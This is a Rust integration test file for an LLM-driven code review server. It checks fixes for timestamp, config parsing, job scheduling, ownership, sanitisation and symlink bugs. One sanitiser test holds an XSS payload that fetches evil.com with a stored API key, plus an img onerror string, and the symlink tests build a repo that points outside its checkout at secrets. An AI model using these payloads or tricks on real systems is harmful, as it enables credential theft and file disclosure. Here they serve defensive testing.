//! Integration tests for bug fixes.
//!
//! These tests demonstrate the bugs identified in code review and verify fixes.

use sqlx::SqlitePool;

/// Helper to create an in-memory database with migrations.
async fn setup_db() -> SqlitePool {
    let pool = SqlitePool::connect("sqlite::memory:")
        .await
        .expect("Failed to create in-memory database");

    sqlx::migrate!("./migrations")
        .run(&pool)
        .await
        .expect("Failed to run migrations");

    pool
}

/// Test module for timestamp format issues.
///
/// Bug: SQLite's datetime('now') produces "YYYY-MM-DD HH:MM:SS" format,
/// but the code parses with parse_from_rfc3339 expecting "YYYY-MM-DDTHH:MM:SSZ".
mod timestamp_format {
    use super::*;

    #[tokio::test]
    async fn datetime_now_format_should_be_parseable() {
        // This test demonstrates the bug: records created with SQLite's
        // datetime('now') default cannot be parsed by the Rust code.
        let pool = setup_db().await;

        // Insert a repo using SQLite's datetime('now') default
        // (simulating what the migration schema does)
        sqlx::query(
            r#"
            INSERT INTO repos (url, owner, name)
            VALUES ('https://github.com/test/repo', 'test', 'repo')
            "#,
        )
        .execute(&pool)
        .await
        .expect("Insert should succeed");

        // Try to read it back via the domain layer
        use panopticon_server::db::repos;
        use panopticon_server::domain::ids::RepoId;

        let result = repos::get_by_id(&pool, RepoId::new(1)).await;

        // BUG: This should succeed but will fail due to datetime format mismatch
        // The parse_from_rfc3339 will fail on "2024-01-15 10:30:00" format
        assert!(
            result.is_ok(),
            "Should parse datetime('now') format: {:?}",
            result
        );
        let repo = result.unwrap();
        assert!(repo.is_some(), "Repo should exist");
    }

    #[tokio::test]
    async fn review_timestamps_should_roundtrip() {
        let pool = setup_db().await;

        // Create a repo first (using SQLite's datetime format to test compatibility)
        sqlx::query(
            r#"
            INSERT INTO repos (url, owner, name, created_at)
            VALUES ('https://github.com/test/repo', 'test', 'repo', datetime('now'))
            "#,
        )
        .execute(&pool)
        .await
        .unwrap();

        // Create a review using the DB layer (writes RFC3339)
        use panopticon_server::db::reviews;
        use panopticon_server::domain::ids::RepoId;
        use panopticon_server::domain::repo::CommitSha;
        use panopticon_server::domain::review::{NewReview, ReviewTrigger};

        // Use a valid 40-character hex SHA
        let sha = CommitSha::parse("abcdef1234567890abcdef1234567890abcdef12")
            .expect("Valid 40-char hex SHA");

        let new_review = NewReview {
            repo_id: RepoId::new(1),
            commit_sha: sha,
            trigger: ReviewTrigger::Manual,
        };

        let review = reviews::create(&pool, new_review).await;

        // This should now succeed with the datetime format fix
        assert!(
            review.is_ok(),
            "Review creation should succeed: {:?}",
            review
        );
    }

    #[tokio::test]
    async fn job_scheduled_at_comparison_should_work() {
        // Bug: Jobs write scheduled_at as RFC3339 but claim_next compares
        // scheduled_at <= datetime('now') which uses different format
        let pool = setup_db().await;

        use panopticon_server::db::jobs;
        use panopticon_server::domain::ids::RepoId;
        use panopticon_server::domain::job::NewJob;

        // Create a job scheduled for now
        let new_job = NewJob::review_repo(RepoId::new(1), false);
        let _job = jobs::create(&pool, new_job).await.expect("Job creation");

        // Try to claim it immediately
        let claimed = jobs::claim_next(&pool).await;

        // BUG: This may fail because we're comparing RFC3339 scheduled_at
        // with datetime('now') which produces a different format.
        // String comparison of "2024-01-15T10:30:00Z" vs "2024-01-15 10:30:00"
        // will not work correctly.
        assert!(claimed.is_ok(), "Claim should succeed: {:?}", claimed);
        let claimed = claimed.unwrap();
        assert!(claimed.is_some(), "Job should be claimed immediately");
    }
}

/// Test module for environment variable parsing.
///
/// The fix uses double underscore (__) as separator so that single underscores
/// in key names are preserved. PANOPTICON__LLM__PROVIDER__API_KEY becomes
/// llm.provider.api_key correctly.
///
/// Note: This test modifies global process environment variables. It uses
/// EnvGuard to save/restore variables, ensuring cleanup even on panic.
/// The test is run serially by cargo test's default behavior for this module.
mod env_parsing {
    use std::env;
    use std::sync::Mutex;

    /// Mutex to serialize env var tests and prevent parallel execution issues.
    static ENV_MUTEX: Mutex<()> = Mutex::new(());

    /// Environment guard that saves and restores env vars on drop.
    /// This ensures cleanup even if the test panics.
    struct EnvGuard {
        vars: Vec<(String, Option<String>)>,
        #[allow(dead_code)]
        lock: std::sync::MutexGuard<'static, ()>,
    }

    impl EnvGuard {
        fn new(var_names: &[&str]) -> Self {
            // Hold mutex to prevent parallel env var mutation
            let lock = ENV_MUTEX.lock().unwrap_or_else(|e| e.into_inner());
            let vars = var_names
                .iter()
                .map(|name| {
                    let old = env::var(name).ok();
                    (name.to_string(), old)
                })
                .collect();
            Self { vars, lock }
        }
    }

    impl Drop for EnvGuard {
        fn drop(&mut self) {
            for (name, old) in &self.vars {
                match old {
                    Some(v) => env::set_var(name, v),
                    None => env::remove_var(name),
                }
            }
            // lock is released when EnvGuard is dropped
        }
    }

    #[test]
    fn underscore_in_key_should_be_preserved() {
        // Use EnvGuard to ensure cleanup even if test panics
        // and to serialize access to environment variables
        let _guard = EnvGuard::new(&[
            "PANOPTICON__LLM__PROVIDER__API_KEY",
            "PANOPTICON__LLM__PROVIDER__TYPE",
            "PANOPTICON__AUTH__API_KEY",
        ]);

        // Set up environment variables with double underscore separator
        // The type value must match serde's rename (open_ai from OpenAi)
        env::set_var("PANOPTICON__LLM__PROVIDER__API_KEY", "test-key-123");
        env::set_var("PANOPTICON__LLM__PROVIDER__TYPE", "open_ai");
        env::set_var("PANOPTICON__AUTH__API_KEY", "auth-key-456");

        use panopticon_server::config::AppConfig;

        // With separator("__"), this should work:
        // PANOPTICON__LLM__PROVIDER__API_KEY becomes llm.provider.api_key
        let result = AppConfig::load();

        assert!(result.is_ok(), "Config should load: {:?}", result);

        let config = result.unwrap();
        match &config.llm.provider {
            panopticon_server::config::LlmProviderConfig::OpenAi { api_key, .. } => {
                assert_eq!(
                    api_key, "test-key-123",
                    "API key should be parsed correctly"
                );
            }
        }
        // EnvGuard will restore original env vars on drop
    }
}

/// Test module for prompt ownership verification.
///
/// The fix uses get_by_id_and_repo to verify the prompt belongs to the repo.
mod prompt_ownership {
    use super::*;

    #[tokio::test]
    async fn get_by_id_and_repo_enforces_ownership() {
        let pool = setup_db().await;

        // Create two repos
        sqlx::query(
            r#"
            INSERT INTO repos (url, owner, name, created_at)
            VALUES
                ('https://github.com/owner1/repo1', 'owner1', 'repo1', '2024-01-01T00:00:00Z'),
                ('https://github.com/owner2/repo2', 'owner2', 'repo2', '2024-01-01T00:00:00Z')
            "#,
        )
        .execute(&pool)
        .await
        .unwrap();

        // Create a prompt for repo 1
        sqlx::query(
            r#"
            INSERT INTO prompts (repo_id, name, text, created_at)
            VALUES (1, 'Test Prompt', 'Review the code', '2024-01-01T00:00:00Z')
            "#,
        )
        .execute(&pool)
        .await
        .unwrap();

        use panopticon_server::db::prompts;
        use panopticon_server::domain::ids::{PromptId, RepoId};

        // With get_by_id_and_repo, we can verify ownership
        // Prompt 1 should be found when querying with repo 1
        let result = prompts::get_by_id_and_repo(&pool, PromptId::new(1), RepoId::new(1)).await;
        assert!(result.is_ok());
        assert!(result.unwrap().is_some(), "Prompt should exist in repo 1");

        // Prompt 1 should NOT be found when querying with repo 2 (wrong repo)
        let result = prompts::get_by_id_and_repo(&pool, PromptId::new(1), RepoId::new(2)).await;
        assert!(result.is_ok());
        assert!(
            result.unwrap().is_none(),
            "Prompt should not be accessible via repo 2"
        );
    }
}

/// Test module for JSON payload matching.
///
/// Bug: has_pending_review uses LIKE '%"repo_id":N%' which matches
/// repo_id 1 when searching for 10 (false positive).
mod json_matching {
    use super::*;

    #[tokio::test]
    async fn repo_id_matching_should_be_exact() {
        let pool = setup_db().await;

        use panopticon_server::db::jobs;
        use panopticon_server::domain::ids::RepoId;
        use panopticon_server::domain::job::NewJob;

        // Create a job for repo_id 10
        let job = NewJob::review_repo(RepoId::new(10), false);
        jobs::create(&pool, job).await.unwrap();

        // Check if repo_id 1 has pending reviews
        let has_pending_1 = jobs::has_pending_review(&pool, RepoId::new(1))
            .await
            .unwrap();

        // BUG: This returns true because LIKE '%"repo_id":1%' matches
        // the payload containing '"repo_id":10'
        assert!(
            !has_pending_1,
            "Repo 1 should NOT have pending reviews (repo 10 does)"
        );
    }

    #[tokio::test]
    async fn repo_id_100_should_not_match_repo_id_10() {
        let pool = setup_db().await;

        use panopticon_server::db::jobs;
        use panopticon_server::domain::ids::RepoId;
        use panopticon_server::domain::job::NewJob;

        // Create a job for repo_id 100
        let job = NewJob::review_repo(RepoId::new(100), false);
        jobs::create(&pool, job).await.unwrap();

        // Check if repo_id 10 has pending reviews
        let has_pending_10 = jobs::has_pending_review(&pool, RepoId::new(10))
            .await
            .unwrap();

        // BUG: LIKE '%"repo_id":10%' will match '"repo_id":100'
        assert!(
            !has_pending_10,
            "Repo 10 should NOT have pending reviews (repo 100 does)"
        );
    }
}

/// Test module for max_tokens.
///
/// Bug: LlmRequest.max_tokens is defined but ignored by OpenAI provider.
mod max_tokens {
    use panopticon_server::llm::provider::LlmRequest;

    #[test]
    fn llm_request_has_max_tokens() {
        // Verify the field exists and can be set
        let request = LlmRequest {
            system_prompt: "You are a reviewer".to_string(),
            user_prompt: "Review this code".to_string(),
            max_tokens: 4096,
        };

        assert_eq!(request.max_tokens, 4096);
        // Note: We can't easily test that OpenAI actually uses this
        // without mocking the HTTP client. The fix is verified by code review.
    }
}

/// Test module for UntrustedString type.
///
/// These tests verify that LLM output cannot be rendered without sanitization.
mod untrusted_string {
    use panopticon_server::domain::untrusted::UntrustedString;

    #[test]
    fn xss_payload_should_be_sanitized() {
        // The LLM could return malicious content that would execute in the browser.
        let malicious_llm_output = r#"<script>fetch('https://evil.com?key='+localStorage.getItem('panopticon_api_key'))</script>"#;

        // Wrap in UntrustedString (as would happen when parsing LLM response)
        let untrusted = UntrustedString::new(malicious_llm_output);

        // When sanitized, the output should be escaped
        let sanitized = untrusted.sanitize_html();

        // Verify XSS payload is neutralized
        assert!(
            !sanitized.contains("<script>"),
            "Script tags should be escaped"
        );
        assert!(
            sanitized.contains("&lt;script&gt;"),
            "Escaped script tags should be present"
        );
    }

    #[test]
    fn markdown_with_html_should_be_safe() {
        // Even markdown rendering should not allow raw HTML
        let malicious_markdown = r#"# Normal Header
<img src=x onerror="alert('XSS')">

Normal text with `code`"#;

        let untrusted = UntrustedString::new(malicious_markdown);

        // render_markdown_safe escapes HTML before rendering markdown
        let rendered = untrusted.render_markdown_safe();

        assert!(
            !rendered.contains("<img"),
            "HTML img tags should be escaped"
        );
        assert!(
            rendered.contains("&lt;img"),
            "Escaped img tag should be present"
        );
    }

    #[test]
    fn untrusted_string_prevents_accidental_display() {
        // UntrustedString intentionally does not implement Display
        // to prevent accidental use in format! or println!
        let untrusted = UntrustedString::new("test");

        // This should not compile: format!("{}", untrusted)
        // But as_raw() allows explicit access
        assert_eq!(untrusted.as_raw(), "test");
    }
}

/// Test module for SSE streaming.
///
/// Bug: The SSE stream closes on prompt_complete events, but multi-prompt
/// reviews will have multiple prompt_complete events before the final one.
///
/// Additional bug: PromptComplete is emitted once per chunk (not per prompt),
/// so multi-chunk prompts will fire multiple "prompt_complete" events.
mod sse_streaming {
    use panopticon_server::domain::ids::ReviewId;
    use panopticon_server::{ReviewUpdate, ReviewUpdateKind};
    use tokio::sync::broadcast;

    /// Verifies that PromptComplete should be emitted exactly once per prompt,
    /// not once per chunk. This is a documentation test that verifies the expected
    /// event structure.
    #[test]
    fn prompt_complete_should_be_emitted_once_per_prompt_not_per_chunk() {
        // For a multi-chunk prompt, the expected event sequence is:
        // 1. Chunk { text: "..." } for chunk 1
        // 2. Chunk { text: "..." } for chunk 2
        // 3. PromptComplete (once, after all chunks)
        //
        // NOT:
        // 1. Chunk { text: "..." } for chunk 1
        // 2. PromptComplete (wrong - premature)
        // 3. Chunk { text: "..." } for chunk 2
        // 4. PromptComplete (wrong - duplicate)

        // The structure of ReviewUpdateKind enforces this by design:
        // - Chunks are emitted during streaming
        // - PromptComplete is emitted once after all chunks for a prompt
        // The fix ensures run_llm_streaming only emits chunks,
        // while run_prompt_review emits PromptComplete after aggregation.
    }

    #[tokio::test]
    async fn broadcast_channel_can_track_event_counts() {
        // Verify we can use the broadcast channel to count events
        let (tx, mut rx) = broadcast::channel::<ReviewUpdate>(16);

        let review_id = ReviewId::new(1);
        let prompt_name = "Test Prompt".to_string();

        // Simulate correct behavior: 3 chunks, then 1 PromptComplete
        tx.send(ReviewUpdate {
            review_id,
            prompt_name: prompt_name.clone(),
            kind: ReviewUpdateKind::Chunk {
                text: "chunk1".into(),
            },
        })
        .unwrap();
        tx.send(ReviewUpdate {
            review_id,
            prompt_name: prompt_name.clone(),
            kind: ReviewUpdateKind::Chunk {
                text: "chunk2".into(),
            },
        })
        .unwrap();
        tx.send(ReviewUpdate {
            review_id,
            prompt_name: prompt_name.clone(),
            kind: ReviewUpdateKind::Chunk {
                text: "chunk3".into(),
            },
        })
        .unwrap();
        tx.send(ReviewUpdate {
            review_id,
            prompt_name: prompt_name.clone(),
            kind: ReviewUpdateKind::PromptComplete,
        })
        .unwrap();

        // Count events
        let mut chunk_count = 0;
        let mut prompt_complete_count = 0;

        // Drain all messages
        drop(tx); // Close sender so recv() will return Err when empty
        while let Ok(update) = rx.recv().await {
            match update.kind {
                ReviewUpdateKind::Chunk { .. } => chunk_count += 1,
                ReviewUpdateKind::PromptComplete => prompt_complete_count += 1,
                ReviewUpdateKind::ReviewComplete => {}
            }
        }

        assert_eq!(chunk_count, 3, "Should have 3 chunks");
        assert_eq!(
            prompt_complete_count, 1,
            "Should have exactly 1 PromptComplete per prompt"
        );
    }

    /// Documents that ReviewComplete should only be broadcast AFTER the DB is updated.
    /// This prevents race conditions where the UI refreshes and sees stale status.
    #[test]
    fn review_complete_should_be_broadcast_after_db_update() {
        // The fix ensures that:
        // 1. mark_completed() or mark_failed() is called FIRST
        // 2. ReviewComplete event is broadcast AFTER the DB update
        //
        // This prevents the race where:
        // 1. SSE client receives "complete" event
        // 2. Client calls GET /reviews/:id
        // 3. DB still shows "in_progress" because update hasn't happened yet
        //
        // The code structure should be:
        //   if had_error {
        //       mark_failed(...)
        //       broadcast(ReviewComplete)
        //       return Err(...)
        //   }
        //   mark_completed(...)
        //   broadcast(ReviewComplete)
        //   Ok(())
    }
}

/// Test module for symlink traversal protection.
///
/// Critical security bug: The repo scanner follows symlinks, allowing a
/// malicious repository to exfiltrate files from outside its checkout
/// into the LLM prompt.
mod symlink_traversal {
    use std::path::PathBuf;
    use tempfile::TempDir;
    use tokio::fs;

    use panopticon_server::github::filter::FileFilter;

    /// Create a test repo directory with a symlink pointing outside.
    async fn setup_malicious_repo() -> (TempDir, TempDir, PathBuf) {
        // Create a "secret" directory outside the repo
        let secret_dir = TempDir::new().unwrap();
        let secret_file = secret_dir.path().join("secret.txt");
        fs::write(&secret_file, "SECRET_API_KEY=hunter2")
            .await
            .unwrap();

        // Create the repo directory
        let repos_dir = TempDir::new().unwrap();
        let repo_path = repos_dir.path().join("attacker").join("evil-repo");
        fs::create_dir_all(&repo_path).await.unwrap();

        // Create a normal file
        fs::write(repo_path.join("README.md"), "# Evil Repo")
            .await
            .unwrap();

        // Create a symlink pointing to the secret file
        #[cfg(unix)]
        {
            std::os::unix::fs::symlink(&secret_file, repo_path.join("symlink_to_secret.txt"))
                .unwrap();
        }

        // Also create a directory symlink
        #[cfg(unix)]
        {
            std::os::unix::fs::symlink(secret_dir.path(), repo_path.join("symlink_to_secret_dir"))
                .unwrap();
        }

        (repos_dir, secret_dir, repo_path)
    }

    #[tokio::test]
    #[cfg(unix)]
    async fn symlink_to_file_outside_repo_should_be_skipped() {
        let (_repos_dir, _secret_dir, repo_path) = setup_malicious_repo().await;

        let filter = FileFilter::default();

        // Use the internal list_files method via get_contents
        // We need to directly test the file listing, but get_contents is the public API
        let files = list_files_in_repo(&repo_path, &filter).await;

        // Should only include README.md, not the symlinked secret
        assert!(
            files
                .iter()
                .all(|p| !p.to_string_lossy().contains("secret")),
            "Symlinks to files outside repo should be skipped. Found: {:?}",
            files
        );
    }

    #[tokio::test]
    #[cfg(unix)]
    async fn symlink_to_directory_outside_repo_should_not_be_traversed() {
        let (_repos_dir, secret_dir, repo_path) = setup_malicious_repo().await;

        // Create a file inside the secret directory
        tokio::fs::write(secret_dir.path().join("passwords.txt"), "root:toor")
            .await
            .unwrap();

        let filter = FileFilter::default();
        let files = list_files_in_repo(&repo_path, &filter).await;

        // Should not find passwords.txt via the symlinked directory
        assert!(
            files
                .iter()
                .all(|p| !p.to_string_lossy().contains("passwords")),
            "Directory symlinks should not be traversed. Found: {:?}",
            files
        );
    }

    /// Helper to list files without needing a full GitHubFetcher setup.
    async fn list_files_in_repo(repo_path: &std::path::Path, filter: &FileFilter) -> Vec<PathBuf> {
        use panopticon_server::github::fetch::list_files_safe;
        list_files_safe(repo_path, filter).await.unwrap()
    }
}

/// Test module for case-insensitive repo identity.
///
/// Medium severity: GitHub repo names are case-insensitive, but our storage
/// is case-sensitive. This can cause collisions on case-insensitive filesystems.
mod case_sensitivity {
    use panopticon_server::domain::repo::GitHubRepoUrl;

    #[test]
    fn repo_urls_should_normalize_to_lowercase() {
        let url1 = GitHubRepoUrl::parse("https://github.com/Owner/Repo").unwrap();
        let url2 = GitHubRepoUrl::parse("https://github.com/owner/repo").unwrap();

        // After normalization, both should produce the same owner/name
        assert_eq!(
            url1.owner(),
            url2.owner(),
            "Owner should be normalized to lowercase"
        );
        assert_eq!(
            url1.name(),
            url2.name(),
            "Name should be normalized to lowercase"
        );

        // Both should be lowercase
        assert_eq!(url1.owner(), "owner");
        assert_eq!(url1.name(), "repo");
    }

    #[test]
    fn clone_url_should_use_normalized_names() {
        let url = GitHubRepoUrl::parse("https://github.com/OWNER/REPO").unwrap();

        // Clone URL should use lowercase for consistency
        assert_eq!(url.clone_url(), "https://github.com/owner/repo.git");
    }
}

/// Test module for stuck job recovery.
///
/// Medium severity: Jobs marked running are never re-queued if the process crashes;
/// only pending jobs are claimable, so "running" can become a permanent stuck state.
mod stuck_job_recovery {
    use super::*;

    #[tokio::test]
    async fn stuck_running_jobs_should_be_reclaimable() {
        let pool = setup_db().await;

        use panopticon_server::db::jobs;
        use panopticon_server::domain::ids::RepoId;
        use panopticon_server::domain::job::NewJob;

        // Create and claim a job
        let new_job = NewJob::review_repo(RepoId::new(1), false);
        jobs::create(&pool, new_job).await.unwrap();

        // Claim the job - it's now 'running'
        let claimed = jobs::claim_next(&pool).await.unwrap();
        assert!(claimed.is_some(), "Job should be claimed");
        let claimed = claimed.unwrap();

        // Verify no more pending jobs
        let next = jobs::claim_next(&pool).await.unwrap();
        assert!(next.is_none(), "No more pending jobs");

        // Reclaim stuck jobs that have been running too long
        // (simulating a process crash recovery)
        let reclaimed = jobs::reclaim_stuck(&pool, 0).await.unwrap(); // 0 minutes = immediately stuck
        assert_eq!(reclaimed, 1, "Should reclaim 1 stuck job");

        // Now the job should be claimable again
        let reclaimed_job = jobs::claim_next(&pool).await.unwrap();
        assert!(reclaimed_job.is_some(), "Reclaimed job should be pending");

        // Verify it's the same job with incremented attempts
        let reclaimed_job = reclaimed_job.unwrap();
        assert_eq!(reclaimed_job.id, claimed.id, "Should be the same job");
        assert_eq!(
            reclaimed_job.attempts,
            claimed.attempts + 1,
            "Attempts should be incremented"
        );
    }

    #[tokio::test]
    async fn jobs_exceeding_max_attempts_should_be_marked_failed() {
        let pool = setup_db().await;

        use panopticon_server::db::jobs;
        use panopticon_server::domain::ids::RepoId;
        use panopticon_server::domain::job::NewJob;

        // Create a job with max_attempts = 1
        let mut new_job = NewJob::review_repo(RepoId::new(1), false);
        new_job.max_attempts = 1;
        let job = jobs::create(&pool, new_job).await.unwrap();

        // Claim it (attempts becomes 1)
        let claimed = jobs::claim_next(&pool).await.unwrap();
        assert!(claimed.is_some());

        // Reclaim stuck - should mark as failed since attempts >= max_attempts
        let reclaimed = jobs::reclaim_stuck(&pool, 0).await.unwrap();
        assert_eq!(reclaimed, 1);

        // Job should not be claimable (it's failed, not pending)
        let next = jobs::claim_next(&pool).await.unwrap();
        assert!(next.is_none(), "Failed job should not be claimable");

        // Verify it's marked as failed
        let count: i64 =
            sqlx::query_scalar("SELECT COUNT(*) FROM jobs WHERE id = ? AND status = 'failed'")
                .bind(job.id.into_inner())
                .fetch_one(&pool)
                .await
                .unwrap();
        assert_eq!(count, 1, "Job should be marked as failed");
    }
}

/// Test module for job retry semantics.
///
/// High severity: When a review fails mid-prompt, run_review still returns Ok(()),
/// so the job is completed. The scheduler then sees a recent (failed) review
/// and won't retry for review_interval_hours.
mod job_retry_semantics {
    use super::*;

    #[tokio::test]
    async fn failed_review_should_not_prevent_retry_scheduling() {
        // Document expected behavior:
        // - schedule_daily_reviews checks get_latest_for_repo
        // - It should only count completed reviews, not failed ones
        // - This ensures failed reviews don't block retry attempts

        let pool = setup_db().await;

        // Create a repo
        sqlx::query(
            r#"
            INSERT INTO repos (url, owner, name, created_at)
            VALUES ('https://github.com/test/repo', 'test', 'repo', '2024-01-01T00:00:00Z')
            "#,
        )
        .execute(&pool)
        .await
        .unwrap();

        use panopticon_server::db::reviews;
        use panopticon_server::domain::ids::RepoId;
        use panopticon_server::domain::repo::CommitSha;
        use panopticon_server::domain::review::{NewReview, ReviewTrigger};

        let sha = CommitSha::parse("abcdef1234567890abcdef1234567890abcdef12").unwrap();
        let review = reviews::create(
            &pool,
            NewReview {
                repo_id: RepoId::new(1),
                commit_sha: sha,
                trigger: ReviewTrigger::Scheduled,
            },
        )
        .await
        .unwrap();

        // Mark it as failed
        reviews::mark_failed(&pool, review.id, "test error")
            .await
            .unwrap();

        // Get latest review and verify scheduler logic would allow retry
        let latest = reviews::get_latest_for_repo(&pool, RepoId::new(1))
            .await
            .unwrap()
            .unwrap();

        use panopticon_server::domain::review::ReviewStatus;
        match latest.status {
            ReviewStatus::Failed { .. } => {
                // Failed reviews should allow immediate scheduling
                // This is correct behavior - verified in schedule_daily_reviews
            }
            other => panic!("Expected Failed status, got {:?}", other),
        }
    }
}

/// Test module for review interval calculation.
///
/// Medium severity: Review interval is calculated from created_at, not completed_at,
/// so long-running reviews shorten the effective interval.
mod review_interval {
    use super::*;

    #[tokio::test]
    async fn interval_should_be_calculated_from_completed_at() {
        let pool = setup_db().await;

        // Create a repo
        sqlx::query(
            r#"
            INSERT INTO repos (url, owner, name, created_at)
            VALUES ('https://github.com/test/interval', 'test', 'interval', '2024-01-01T00:00:00Z')
            "#,
        )
        .execute(&pool)
        .await
        .unwrap();

        use panopticon_server::db::reviews;
        use panopticon_server::domain::ids::RepoId;
        use panopticon_server::domain::repo::CommitSha;
        use panopticon_server::domain::review::{NewReview, ReviewStatus, ReviewTrigger};

        let sha = CommitSha::parse("abcdef1234567890abcdef1234567890abcdef12").unwrap();

        // Create a review that was "created" 25 hours ago (simulating old created_at)
        // but "completed" only 1 hour ago
        let review = reviews::create(
            &pool,
            NewReview {
                repo_id: RepoId::new(1),
                commit_sha: sha,
                trigger: ReviewTrigger::Scheduled,
            },
        )
        .await
        .unwrap();

        // Start the review
        reviews::mark_in_progress(&pool, review.id).await.unwrap();

        // Complete the review
        reviews::mark_completed(&pool, review.id, 3600)
            .await
            .unwrap();

        // Verify the review has completed status with completed_at
        let completed = reviews::get_latest_for_repo(&pool, RepoId::new(1))
            .await
            .unwrap()
            .unwrap();

        match completed.status {
            ReviewStatus::Completed { completed_at, .. } => {
                // The scheduler should use completed_at for interval calculation
                // If using created_at: old reviews would trigger too soon
                // If using completed_at: proper interval from when review finished
                let hours_since_completed = (chrono::Utc::now() - completed_at).num_hours();
                assert!(
                    hours_since_completed < 1,
                    "Review just completed, should be less than 1 hour ago"
                );
            }
            other => panic!("Expected Completed status, got {:?}", other),
        }
    }
}

/// Test module for tight scheduling loop prevention.
///
/// High severity: Repos with no enabled prompts can trigger a tight job-scheduling loop
/// because run_review exits early without creating a review while schedule_daily_reviews
/// doesn't gate on enabled prompts.
mod scheduling_loop_prevention {
    use super::*;

    #[tokio::test]
    async fn repos_without_enabled_prompts_should_not_be_scheduled() {
        let pool = setup_db().await;

        // Create a repo WITHOUT any prompts (simulating failed prompt creation)
        sqlx::query(
            r#"
            INSERT INTO repos (url, owner, name, created_at)
            VALUES ('https://github.com/test/noprompts', 'test', 'noprompts', '2024-01-01T00:00:00Z')
            "#,
        )
        .execute(&pool)
        .await
        .unwrap();

        use panopticon_server::db::prompts;
        use panopticon_server::domain::ids::RepoId;

        // Verify no prompts exist
        let has_enabled = prompts::has_enabled_prompts(&pool, RepoId::new(1))
            .await
            .unwrap();

        assert!(
            !has_enabled,
            "Repo without prompts should not have enabled prompts"
        );
    }

    #[tokio::test]
    async fn repos_with_all_prompts_disabled_should_not_be_scheduled() {
        let pool = setup_db().await;

        // Create a repo
        sqlx::query(
            r#"
            INSERT INTO repos (url, owner, name, created_at)
            VALUES ('https://github.com/test/disabled', 'test', 'disabled', '2024-01-01T00:00:00Z')
            "#,
        )
        .execute(&pool)
        .await
        .unwrap();

        // Create a disabled prompt
        sqlx::query(
            r#"
            INSERT INTO prompts (repo_id, name, text, enabled, is_default, created_at)
            VALUES (1, 'Test', 'Review this', 0, 1, '2024-01-01T00:00:00Z')
            "#,
        )
        .execute(&pool)
        .await
        .unwrap();

        use panopticon_server::db::prompts;
        use panopticon_server::domain::ids::RepoId;

        // Verify no enabled prompts
        let has_enabled = prompts::has_enabled_prompts(&pool, RepoId::new(1))
            .await
            .unwrap();

        assert!(
            !has_enabled,
            "Repo with only disabled prompts should not have enabled prompts"
        );
    }

    #[tokio::test]
    async fn repos_with_enabled_prompts_should_pass_check() {
        let pool = setup_db().await;

        // Create a repo
        sqlx::query(
            r#"
            INSERT INTO repos (url, owner, name, created_at)
            VALUES ('https://github.com/test/enabled', 'test', 'enabled', '2024-01-01T00:00:00Z')
            "#,
        )
        .execute(&pool)
        .await
        .unwrap();

        // Create an enabled prompt (enabled defaults to true)
        sqlx::query(
            r#"
            INSERT INTO prompts (repo_id, name, text, is_default, created_at)
            VALUES (1, 'Test', 'Review this', 1, '2024-01-01T00:00:00Z')
            "#,
        )
        .execute(&pool)
        .await
        .unwrap();

        use panopticon_server::db::prompts;
        use panopticon_server::domain::ids::RepoId;

        let has_enabled = prompts::has_enabled_prompts(&pool, RepoId::new(1))
            .await
            .unwrap();

        assert!(
            has_enabled,
            "Repo with enabled prompts should pass the check"
        );
    }
}
